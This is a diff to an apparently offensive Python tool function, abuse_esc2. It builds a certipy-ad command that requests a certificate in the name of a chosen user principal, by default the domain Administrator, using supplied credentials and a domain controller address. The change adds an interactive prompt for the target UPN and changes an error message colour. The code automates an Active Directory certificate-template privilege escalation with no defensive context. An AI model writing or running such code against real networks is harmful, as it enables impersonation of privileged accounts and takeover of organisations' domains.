@@ -18,7 +18,8 @@ def abuse_esc2(session, template_name, save=False):
         return
 
     output_file = f"esc2_{template_name}.pfx"
-    upn = f"Administrator@{session.domain}"
+    default_upn = f"Administrator@{session.domain}"
+    upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn
 
     cmd = (
         f"certipy-ad req -u {session.username} -p {session.password} -dc-ip {session.dc_ip} "
@@ -30,7 +31,7 @@ def abuse_esc2(session, template_name, save=False):
     stdout, stderr = run_command(cmd)
 
     if stderr:
-        print(red(f"[!] Certipy returned error:\n{stderr.strip()}"))
+        print(yellow(f"[!] Certipy returned error:\n{stderr.strip()}"))
 
     if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
         print(red("[-] Certificate request failed or file not valid."))
